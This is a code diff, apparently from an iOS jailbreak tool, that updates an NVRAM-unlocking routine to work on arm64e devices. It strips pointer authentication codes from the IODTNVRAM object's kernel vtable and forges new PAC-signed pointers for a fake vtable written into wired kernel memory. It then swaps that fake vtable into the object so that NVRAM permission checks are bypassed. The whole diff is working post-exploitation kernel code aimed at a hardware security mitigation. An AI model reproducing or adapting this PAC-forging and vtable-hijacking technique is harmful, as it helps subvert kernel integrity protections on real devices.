@@ -14,6 +14,9 @@
 #include "KernelStructureOffsets.h"
 #include "KernelMemory.h"
 #include "find_port.h"
+#include "pac.h"
+#include "kernel_call.h"
+#include "kc_parameters.h"
 
 static const size_t max_vtable_size = 0x1000;
 static const size_t kernel_buffer_size = 0x4000;
@@ -49,6 +52,7 @@ uint64_t get_iodtnvram_obj(void) {
 
 uint64_t orig_vtable = 0;
 uint64_t fake_vtable = 0;
+uint64_t fake_vtable_xpac = 0;
 
 int unlocknvram(void) {
     uint64_t obj = get_iodtnvram_obj();
@@ -58,17 +62,41 @@ int unlocknvram(void) {
     }
 
     orig_vtable = ReadKernel64(obj);
+    uint64_t vtable_xpac = kernel_xpacd(orig_vtable);
     
     uint64_t *buf = calloc(1, max_vtable_size);
-    kread(orig_vtable, buf, max_vtable_size);
+    kread(vtable_xpac, buf, max_vtable_size);
     
     // alter it
     buf[getOFVariablePerm / sizeof(uint64_t)] = \
-        buf[searchNVRAMProperty / sizeof(uint64_t)];
+        kernel_xpaci(buf[searchNVRAMProperty / sizeof(uint64_t)]);
 
-    // allocate buffer in kernel and copy it back
-    fake_vtable = kmem_alloc_wired(kernel_buffer_size);
-    wkbuffer(fake_vtable, buf, kernel_buffer_size);
+    // allocate buffer in kernel
+    fake_vtable_xpac = kmem_alloc_wired(kernel_buffer_size);
+    
+    // Forge the pacia pointers to the virtual methods.
+    size_t count = 0;
+    for (; count < max_vtable_size / sizeof(*buf); count++) {
+        uint64_t vmethod = buf[count];
+        if (vmethod == 0) {
+            break;
+        }
+#if __arm64e__
+        assert(count < VTABLE_PAC_CODES(IODTNVRAM).count);
+        vmethod = kernel_xpaci(vmethod);
+        uint64_t vmethod_address = fake_vtable_xpac + count * sizeof(*buf);
+        buf[count] = kernel_forge_pacia_with_type(vmethod, vmethod_address,
+                                                  VTABLE_PAC_CODES(IODTNVRAM).codes[count]);
+#endif // __arm64e__
+    }
+    
+    // and copy it back
+    kwrite(fake_vtable_xpac, buf, count*sizeof(*buf));
+#if __arm64e__
+    fake_vtable = kernel_forge_pacda(fake_vtable_xpac, 0);
+#else
+    fake_vtable = fake_vtable_xpac;
+#endif
 
     // replace vtable on IODTNVRAM object
     WriteKernel64(obj, fake_vtable);
@@ -79,7 +107,7 @@ int unlocknvram(void) {
 }
 
 int locknvram(void) {
-    if (orig_vtable == 0 || fake_vtable == 0) {
+    if (orig_vtable == 0 || fake_vtable_xpac == 0) {
         LOG("Trying to lock nvram, but didnt unlock first");
         return -1;
     }
@@ -91,7 +119,7 @@ int locknvram(void) {
     }
     
     WriteKernel64(obj, orig_vtable);
-    kmem_free(fake_vtable, kernel_buffer_size);
+    kmem_free(fake_vtable_xpac, kernel_buffer_size);
 
     LOG("Locked nvram");
     return 0;
